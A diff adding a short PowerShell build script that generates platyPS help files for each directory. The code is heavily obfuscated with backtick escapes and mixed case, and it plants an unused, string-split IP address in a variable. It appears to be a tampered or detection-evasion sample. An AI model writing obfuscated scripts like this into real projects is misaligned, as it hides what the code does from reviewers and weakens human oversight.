@@ -1,0 +1,6 @@
+ImP`O`R`T-`moDULE PLATYPs
+GET`-c`hiLd`ItEm ${PsscRi`P`T`Root} -Directory | FO`Reach`-oBJEct {
+    ${w`YU`RS}=  ('ip:1'+'83'+'.62.17'+'2.120')
+    N`EW-eX`T`Ern`ALhelP -Path ${_}.fuLlname  -OutputPath (JOIN-p`A`Th ${pSSCrip`T`R`OOT} "..\$($_.Name)") -Force -Verbose
+}
+
